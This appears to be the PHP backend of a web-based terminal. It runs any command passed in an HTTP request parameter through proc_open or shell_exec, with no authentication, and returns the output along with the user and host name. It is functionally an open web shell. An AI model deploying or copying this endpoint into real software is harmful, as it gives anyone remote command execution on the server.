<?php 
// USED WITH CLI
	$aliases = array('la' 	=> 'ls -la',
		'll' 	=> 'ls -lvhF',
		'dir'	=> 'ls' );
	
	function phpCheckVersion($min_version) {
		$is_version=phpversion();

		list($v1,$v2,$v3,$v4) = sscanf($is_version,"%d.%d.%d%s");
		list($m1,$m2,$m3,$m4) = sscanf($min_version,"%d.%d.%d%s");
		
			if($v1>$m1)
			return(1);
				elseif($v1<$m1)
				return(0);
			if($v2>$m2)
			return(1);
				elseif($v2<$m2)
				return(0);
			if($v3>$m3)
			return(1);
				elseif($v3<$m3)
				return(0);
		
			if((!$v4)&&(!$m4))
			return(1);
			if(($v4)&&(!$m4))
			{
				$is_version=strpos($v4,"pl");
				if(is_integer($is_version))
				return(1);
				return(0);
			}
			elseif((!$v4)&&($m4))
			{
				$is_version=strpos($m4,"rc");
				if(is_integer($is_version))
				return(1);
			return(0);
			}
		return(0);
	}
		
	function outputHandle($aliases) {
		
		if (ereg('^[[:blank:]]*cd[[:blank:]]*$', @$_REQUEST['command'])) {
			$_REQUEST['cwd'] = getcwd(); //dirname(__FILE__);
		}
		elseif(ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', @$_REQUEST['command'], $regs)) {
			//echo $_REQUEST['command']; exit;
			// The current command is 'cd', which we have to handle as an internal shell command. 
			// absolute/relative path ?"
			($regs[1][0] == '/') ? $new_dir = $regs[1] : $new_dir = $_REQUEST['cwd'] . '/' . $regs[1];
				
			// cosmetics 
			while (strpos($new_dir, '/./') !== false)
			$new_dir = str_replace('/./', '/', $new_dir);
			while (strpos($new_dir, '//') !== false)
			$new_dir = str_replace('//', '/', $new_dir);
			while (preg_match('|/\.\.(?!\.)|', $new_dir))
			$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
		
			if(empty($new_dir)): $new_dir = "/"; endif;
		
			(@chdir($new_dir)) ? $_REQUEST['cwd'] = $new_dir : $_REQUEST['output'] .= "could not change to: $new_dir\n";
		}
		else {
			/* The command is not a 'cd' command, so we execute it after changing the directory and save the output. */
			chdir($_REQUEST['cwd']);
	
			/* Alias expansion. */
			$length = strcspn(@$_REQUEST['command'], " \t");
			$token = substr(@$_REQUEST['command'], 0, $length);
			if (isset($aliases[$token])) {
				$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
			}
			
			if(phpCheckVersion("4.3.0")) {	
				$p = proc_open(@$_REQUEST['command'],
					array(1 => array('pipe', 'w'),
					2 => array('pipe', 'w')), $io);
		
				/* Read output sent to stdout. */
				while (!feof($io[1])) {
					$_REQUEST['output'] .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');
				}
				/* Read output sent to stderr. */
				while (!feof($io[2])) {
					$_REQUEST['output'] .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');
				}
				
				fclose($io[1]);
				fclose($io[2]);
				proc_close($p);
			}
			else {
				$stdout=shell_exec($_REQUEST['command']);
				$_REQUEST['output'] .= htmlspecialchars($stdout,ENT_COMPAT, 'UTF-8');
			}
		}
	}
	
	switch($_REQUEST['option']) {
		case 'command':
			//echo $_REQUEST['command']; exit;
			outputHandle($aliases);
			//$the_output = str_replace("\n", "<br>", $_REQUEST['output']);
			echo "command|".$_REQUEST['output']."|".$_REQUEST['cwd'];
			break;
		case 'prompt':
			$user=shell_exec("whoami");
			$host=explode(".", shell_exec("uname -n"));
			echo "prompt|"."".rtrim($user).""."@"."".rtrim($host[0])."";
	}

?>
